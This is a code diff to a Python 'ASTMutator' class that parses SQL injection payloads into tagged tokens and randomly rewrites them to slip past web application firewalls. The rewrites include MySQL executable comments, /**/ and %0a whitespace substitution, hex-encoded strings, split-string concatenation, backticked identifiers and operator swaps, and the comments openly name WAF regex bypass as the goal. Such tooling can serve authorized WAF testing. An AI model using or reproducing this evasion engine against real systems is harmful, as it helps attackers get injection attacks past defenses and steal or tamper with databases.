@@ -245,11 +245,56 @@ class ASTMutator:
             pos = match.end()
         return tokens
 
+    def _analyze_semantics(self, tokens):
+        """
+        Deep Semantic Awareness (The 'Human Thought' Layer)
+        Analyzes tokens in context to understand *why* they are used, what they mean,
+        and what grammatical rules apply to their neighbors.
+        """
+        for i, tok in enumerate(tokens):
+            prev_tok = tokens[i-1] if i > 0 else None
+            next_tok = tokens[i+1] if i < len(tokens) - 1 else None
+            
+            # Default missing elements
+            tok['role'] = 'UNKNOWN'
+            tok['neighbors'] = {'prev': prev_tok['type'] if prev_tok else None, 
+                                'next': next_tok['type'] if next_tok else None}
+
+            if tok['type'] == 'KEYWORD':
+                val = tok['value'].upper()
+                if val in ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER BY', 'GROUP BY', 'HAVING']:
+                    tok['role'] = 'CLAUSE_STARTER' # Defines the structure of the query block
+                elif val in ['AND', 'OR', 'XOR', '&&', '||']:
+                    tok['role'] = 'LOGICAL_JUNCTION' # Bridges expressions
+                elif next_tok and next_tok['value'] == '(':
+                    tok['role'] = 'FUNCTION_CALL' # It's executing an action
+                else:
+                    tok['role'] = 'COMMAND'
+
+            elif tok['type'] == 'IDENTIFIER':
+                if prev_tok and prev_tok['value'].upper() in ['FROM', 'JOIN']:
+                    tok['role'] = 'TABLE_NAME'
+                elif prev_tok and prev_tok['value'].upper() == 'BY':
+                    tok['role'] = 'COLUMN_INDEX'
+                elif next_tok and next_tok['type'] == 'OPERATOR':
+                    tok['role'] = 'COMPARISON_TARGET' # It's a column being compared
+                else:
+                    tok['role'] = 'COLUMN_NAME'
+                    
+            elif tok['type'] == 'OPERATOR':
+                tok['role'] = 'COMPARATOR'
+                
+            elif tok['type'] in ['STRING', 'NUMBER', 'HEX_BIT']:
+                tok['role'] = 'LITERAL_VALUE' # Static data injection
+                
+        return tokens
+
     def _build_ast(self, tokens):
         """
-        AST Builder: Converts a flat list of tokens into a hierarchical Abstract Syntax Tree.
+        AST Builder: Converts a flat list of semantically tagged tokens into a hierarchical Abstract Syntax Tree.
         Groups into [CLAUSES] -> [EXPRESSIONS] -> [LITERALS/OPERATORS]
         """
+        tokens = self._analyze_semantics(tokens)
         ast = {"type": "ROOT", "children": []}
         current_node = ast
         stack = []
@@ -307,50 +352,67 @@ class ASTMutator:
         elif isinstance(node, dict) and "type" in node and "value" in node:
             t_type = node['type']
             val = node['value']
+            role = node.get('role', 'UNKNOWN')
             
-            # Semantic Mutation Logic
+            # Semantic Mutation Logic powered by Human-Like Context Awareness
+            
+            # --- 1. Role-based Logic ---
+            if role == 'LOGICAL_JUNCTION' and random.random() < 0.4:
+                # E.g. 'AND' can be swapped safely to '&&'. Because we KNOW it's a bridge, not a column name.
+                if val.upper() == 'AND': val = '&&'
+                elif val.upper() == 'OR': val = '||'
+                
+            elif role == 'FUNCTION_CALL' and random.random() < 0.4:
+                # If we know it's a function call (next token is parenthesis), 
+                # we can insert spaces/comments before the bracket safely in MySQL to break WAF regexes.
+                val = f"{val} /*!*/"
+                
+            elif role == 'TABLE_NAME' and random.random() < 0.3:
+                # Table names can be safely backticked or combined with database name (schema bypass)
+                if not val.startswith("`"):
+                    val = f"`{val}`"
+                    
+            elif role == 'COLUMN_NAME' and random.random() < 0.3:
+                # Similar to table names but we can inject table alias prefixes if we want to confuse
+                if not val.startswith("`"):
+                    val = f"`{val}`"
+            
+            # --- 2. Type-based Fallback Logic ---
             if t_type == 'OPERATOR' and val in semantic_dict["OPERATORS"]:
                 if random.random() < 0.3:
-                    # Choose a functionally equivalent operator from the dictionary
                     val = random.choice(semantic_dict["OPERATORS"][val])
                     
-            elif t_type == 'KEYWORD':
+            elif t_type == 'KEYWORD' and role not in ['LOGICAL_JUNCTION', 'FUNCTION_CALL']:
                 upper_val = val.upper()
                 if upper_val in semantic_dict["LOGICAL_FUNCTIONS"] and random.random() < 0.4:
                     val = random.choice(semantic_dict["LOGICAL_FUNCTIONS"][upper_val])
                 elif random.random() < 0.6:
-                    # Specific MySQL feature: Executable Comments
-                    # These execute their contents in MySQL uniquely
                     ver = random.choice(["10000", "50000", "50100", "50500", "50700", "00000"])
                     val = f"/*!{ver}{val}*/"
                     
-            elif t_type == 'STRING':
-                # MySQL String tricks
+            elif t_type == 'STRING' and role == 'LITERAL_VALUE':
                 coin = random.random()
                 if coin < 0.2:
-                    # Hex conversion trick for purely string literals (like 'admin' -> 0x61646d696e)
                     inside = val[1:-1]
-                    if re.match(r"^[a-zA-Z0-9_]+$", inside): # Only for simple strings
+                    if re.match(r"^[a-zA-Z0-9_]+$", inside): 
                         val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
                 elif coin < 0.4 and len(val) > 4:
-                    # Concatenation Evasion without CONCAT: 'adm' 'in' is valid MySQL
+                    # 'adm' 'in' concatenation
                     quote_char = val[0]
                     inside = val[1:-1]
                     mid = len(inside) // 2
                     val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
                     
-            elif t_type == 'IDENTIFIER':
-                # MySQL Identifier masking using `backticks`
+            elif t_type == 'IDENTIFIER' and role not in ['TABLE_NAME', 'COLUMN_NAME']:
                 if not val.startswith("`") and random.random() < 0.4:
                     val = f"`{val}`"
 
             elif t_type == 'WHITESPACE':
-                # Replaced spaces with arbitrary internal comments
                 coin = random.random()
                 if coin < 0.2:
                     val = "/**/"
                 elif coin < 0.3:
-                    val = "%0a"  # MySQL treats newlines implicitly as spaces in URL contexts
+                    val = "%0a"  
                     
             return val
         
